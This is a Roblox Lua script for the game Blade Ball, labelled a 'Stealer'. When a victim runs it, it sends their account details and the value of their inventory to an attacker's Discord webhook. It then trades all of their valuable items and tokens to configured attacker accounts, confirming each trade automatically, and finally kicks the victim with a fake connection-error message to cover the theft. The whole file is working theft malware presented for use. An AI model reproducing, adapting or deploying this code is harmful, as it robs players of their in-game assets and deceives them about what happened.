_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Security Checks
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("only work on server normal")
    return
end

-- Function to get the Profile Picture
local function getPDP()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Optimized Embed Sender (Pro Style)
local function SendWebhook(status, list, totalRAPVal)
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local itemSummary = ""
    for name, count in pairs(grouped) do
        itemSummary = itemSummary .. name .. " (x" .. count .. ")\n"
    end
    
    if #itemSummary > 800 then itemSummary = string.sub(itemSummary, 1, 800) .. "\nPlus more!" end

    local joinCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
    local browserJoin = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId

    local data = {
        ["content"] = (status == "JOIN" and ping == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCommand .. "`",
        ["embeds"] = {{
            ["title"] = "📁 Pending Hit ... | ⚔️ Blade Ball Stealer",
            ["color"] = (status == "JOIN" and 16763904 or 8323327),
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🎯 Inventory:",
                    ["value"] = "```" ..
                        "\n💰 Total RAP: " .. formatNumber(totalRAPVal) ..
                        "\n\n" .. itemSummary ..
                        "```",
                    ["inline"] = false
                },
                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..browserJoin..")", ["inline"] = true},
                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
            },
            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
            ["thumbnail"] = {["url"] = getPDP()}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

-- Inventory Scanner (Your Original Logic)
local totalRAP = 0
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    if not rapData[category] then return nameToRAP end
    for serializedKey, rap in pairs(rapData[category]) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

for _, category in ipairs(categories) do
    local rapMap = buildNameToRAPMap(category)
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = rapMap[itemInfo.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- Execution Start
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendWebhook("JOIN", itemsToSend, totalRAP)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            -- Send Request
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(joinedUser)) end)
            repeat wait(0.5) until tradeGui.Enabled

            -- Add Items
            local batchCount = 0
            while #itemsToSend > 0 and batchCount < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                batchCount = batchCount + 1
            end

            -- Add Tokens (Your original logic)
            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
            local cleanedText = rawText:gsub("[^%d]", "")
            local tokensamount = tonumber(cleanedText) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            -- Complete Trade
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat wait(0.2) until not tradeGui.Enabled
        end
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end

    -- Wait for User
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then doTrade(p.Name) break end
    end
    Players.PlayerAdded:Connect(function(player)
        if table.find(users, player.Name) then doTrade(player.Name) end
    end)
end
